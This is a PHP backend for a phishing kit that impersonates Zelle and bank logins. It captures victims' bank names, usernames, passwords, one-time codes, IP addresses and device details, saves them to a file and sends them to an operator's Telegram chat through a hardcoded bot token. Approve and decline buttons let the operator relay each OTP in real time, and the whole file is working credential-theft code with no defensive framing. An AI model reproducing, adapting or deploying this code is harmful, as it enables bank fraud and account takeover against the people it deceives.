<?php
// Zelle/Plaid Backend API with Telegram Integration
// ========================================
// TELEGRAM CONFIGURATION
// ========================================
define('TELEGRAM_BOT_TOKEN', '5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00');
define('TELEGRAM_CHAT_ID', '5514645660');

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, PUT, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Data file
define('DATA_FILE', __DIR__ . '/zelle-data.json');

// Initialize data file
if (!file_exists(DATA_FILE)) {
    file_put_contents(DATA_FILE, json_encode(['users' => []], JSON_PRETTY_PRINT));
}

// Read data
function readData() {
    $json = file_get_contents(DATA_FILE);
    return json_decode($json, true) ?: ['users' => []];
}

// Write data
function writeData($data) {
    file_put_contents(DATA_FILE, json_encode($data, JSON_PRETTY_PRINT));
}

// Send to Telegram
function sendToTelegram($message, $inlineKeyboard = null) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $payload = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    if ($inlineKeyboard) {
        $payload['reply_markup'] = json_encode([
            'inline_keyboard' => $inlineKeyboard
        ]);
    }
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// Get IP details
function getIPDetails() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $details = ['ip' => $ip, 'country' => 'Unknown', 'isp' => 'Unknown'];
    
    try {
        $response = @file_get_contents("http://ip-api.com/json/{$ip}");
        if ($response) {
            $data = json_decode($response, true);
            $details['country'] = $data['country'] ?? 'Unknown';
            $details['isp'] = $data['isp'] ?? 'Unknown';
        }
    } catch (Exception $e) {
        // Ignore errors
    }
    
    return $details;
}

// Route handling
$method = $_SERVER['REQUEST_METHOD'];
$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// GET /api/zelle-payment (health check)
if ($method === 'GET' && strpos($path, '/api/zelle-payment') !== false) {
    echo json_encode(['status' => 'ok', 'payment' => ['name' => 'John Doe', 'amount' => 500]]);
    exit();
}

// POST /api/zelle-payment (update payment info)
if ($method === 'POST' && strpos($path, '/api/zelle-payment') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    echo json_encode(['success' => true]);
    exit();
}

// GET /api/admin/dashboard-stats
if ($method === 'GET' && strpos($path, '/api/admin/dashboard-stats') !== false) {
    $data = readData();
    $totalUsers = count($data['users']);
    $pendingOTP = 0;
    
    foreach ($data['users'] as $user) {
        if ($user['otp_status'] === 'pending') {
            $pendingOTP++;
        }
    }
    
    echo json_encode([
        'success' => true,
        'stats' => [
            'totalUsers' => $totalUsers,
            'pendingOTP' => $pendingOTP
        ]
    ]);
    exit();
}

// GET /api/admin/user-credentials
if ($method === 'GET' && strpos($path, '/api/admin/user-credentials') !== false) {
    $data = readData();
    echo json_encode([
        'success' => true,
        'users' => $data['users']
    ]);
    exit();
}

// PUT /api/admin/update-otp-status
if ($method === 'PUT' && strpos($path, '/api/admin/update-otp-status') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $userId = $input['userId'] ?? null;
    $newStatus = $input['newStatus'] ?? null;
    
    if (!$userId || !$newStatus) {
        echo json_encode(['success' => false, 'error' => 'Missing userId or newStatus']);
        exit();
    }
    
    $data = readData();
    foreach ($data['users'] as &$user) {
        if ($user['id'] === $userId) {
            $user['otp_status'] = $newStatus;
            break;
        }
    }
    writeData($data);
    
    echo json_encode(['success' => true]);
    exit();
}

// POST /api/bank-click
if ($method === 'POST' && strpos($path, '/api/bank-click') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $ipDetails = getIPDetails();
    
    $data = readData();
    
    $newUser = [
        'id' => time(),
        'bank_name' => $input['name'] ?? 'Unknown',
        'username' => 'Awaiting Login...',
        'password' => '',
        'otp_code' => '',
        'otp_status' => 'idle',
        'created_at' => date('Y-m-d H:i:s'),
        'ip' => $ipDetails['ip']
    ];
    
    $data['users'][] = $newUser;
    writeData($data);
    
    // Send to Telegram
    $message = "🏦 <b>ZELLE - BANK SELECTED</b>\n\n";
    $message .= "🏛️ <b>Bank:</b> " . ($input['name'] ?? 'Unknown') . "\n";
    $message .= "🌐 <b>IP:</b> {$ipDetails['ip']}\n";
    $message .= "🌍 <b>Country:</b> {$ipDetails['country']} | 📶 <b>ISP:</b> {$ipDetails['isp']}\n";
    $message .= "📱 <b>Device:</b> " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";
    $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
    
    sendToTelegram($message);
    
    echo json_encode(['success' => true, 'userId' => $newUser['id']]);
    exit();
}

// POST /api/save (save credentials)
if ($method === 'POST' && strpos($path, '/api/save') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $ipDetails = getIPDetails();
    
    $username = $input['username'] ?? '';
    $password = $input['password'] ?? '';
    $userId = $input['userId'] ?? null;
    
    $data = readData();
    
    $bankName = 'Unknown';
    if ($userId) {
        // Update existing user
        foreach ($data['users'] as &$user) {
            if ($user['id'] == $userId) {
                $user['username'] = $username;
                $user['password'] = $password;
                $bankName = $user['bank_name'];
                break;
            }
        }
    } else {
        // Create new user
        $newUser = [
            'id' => time(),
            'username' => $username,
            'password' => $password,
            'bank_name' => 'Unknown',
            'otp_code' => '',
            'otp_status' => 'idle',
            'created_at' => date('Y-m-d H:i:s'),
            'ip' => $ipDetails['ip']
        ];
        
        $data['users'][] = $newUser;
        $userId = $newUser['id'];
    }
    
    writeData($data);
    
    // Send to Telegram
    $message = "🔐 <b>ZELLE - CREDENTIALS CAPTURED</b>\n\n";
    $message .= "🏛️ <b>Bank:</b> {$bankName}\n";
    $message .= "👤 <b>Username:</b> <code>{$username}</code>\n";
    $message .= "🔑 <b>Password:</b> <code>{$password}</code>\n\n";
    $message .= "🌐 <b>IP:</b> {$ipDetails['ip']}\n";
    $message .= "🌍 <b>Country:</b> {$ipDetails['country']} | 📶 <b>ISP:</b> {$ipDetails['isp']}\n";
    $message .= "📱 <b>Device:</b> " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";
    $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
    
    sendToTelegram($message);
    
    echo json_encode(['success' => true, 'id' => $userId]);
    exit();
}

// POST /api/save-otp
if ($method === 'POST' && strpos($path, '/api/save-otp') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    $ipDetails = getIPDetails();
    
    $code = $input['code'] ?? '';
    $userId = $input['userId'] ?? null;
    
    $data = readData();
    
    $bankName = 'Unknown';
    $username = 'Unknown';
    
    if ($userId) {
        foreach ($data['users'] as &$user) {
            if ($user['id'] == $userId) {
                $user['otp_code'] = $code;
                $user['otp_status'] = 'pending';
                $bankName = $user['bank_name'];
                $username = $user['username'];
                break;
            }
        }
    }
    
    writeData($data);
    
    // Send to Telegram with inline keyboard
    $message = "🔢 <b>ZELLE - OTP RECEIVED</b>\n\n";
    $message .= "🏛️ <b>Bank:</b> {$bankName}\n";
    $message .= "👤 <b>Username:</b> <code>{$username}</code>\n";
    $message .= "🔐 <b>OTP Code:</b> <code>{$code}</code>\n\n";
    $message .= "🌐 <b>IP:</b> {$ipDetails['ip']}\n";
    $message .= "🌍 <b>Country:</b> {$ipDetails['country']} | 📶 <b>ISP:</b> {$ipDetails['isp']}\n";
    $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "⚠️ <b>Status:</b> Waiting for your action...";
    
    $inlineKeyboard = [
        [
            ['text' => '✅ Approve', 'callback_data' => 'approve_' . $userId],
            ['text' => '❌ Decline', 'callback_data' => 'decline_' . $userId]
        ]
    ];
    
    sendToTelegram($message, $inlineKeyboard);
    
    echo json_encode(['success' => true]);
    exit();
}

// GET /api/check-otp-status
if ($method === 'GET' && strpos($path, '/api/check-otp-status') !== false) {
    $userId = $_GET['id'] ?? null;
    
    if (!$userId) {
        echo json_encode(['success' => false, 'error' => 'Missing userId']);
        exit();
    }
    
    $data = readData();
    
    foreach ($data['users'] as $user) {
        if ($user['id'] == $userId) {
            echo json_encode(['otp_status' => $user['otp_status']]);
            exit();
        }
    }
    
    echo json_encode(['otp_status' => 'pending']);
    exit();
}

// Telegram webhook handler (for inline keyboard callbacks)
if ($method === 'POST' && strpos($path, '/telegram-webhook') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (isset($input['callback_query'])) {
        $callbackData = $input['callback_query']['data'];
        list($action, $userId) = explode('_', $callbackData);
        
        $data = readData();
        
        foreach ($data['users'] as &$user) {
            if ($user['id'] == $userId) {
                $user['otp_status'] = $action === 'approve' ? 'approved' : 'declined';
                break;
            }
        }
        
        writeData($data);
        
        // Answer callback
        $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/answerCallbackQuery";
        $payload = [
            'callback_query_id' => $input['callback_query']['id'],
            'text' => $action === 'approve' ? '✅ OTP Approved' : '❌ OTP Declined'
        ];
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($ch);
        curl_close($ch);
    }
    
    echo json_encode(['ok' => true]);
    exit();
}

// 404
http_response_code(404);
echo json_encode(['success' => false, 'error' => 'Endpoint not found']);
?>
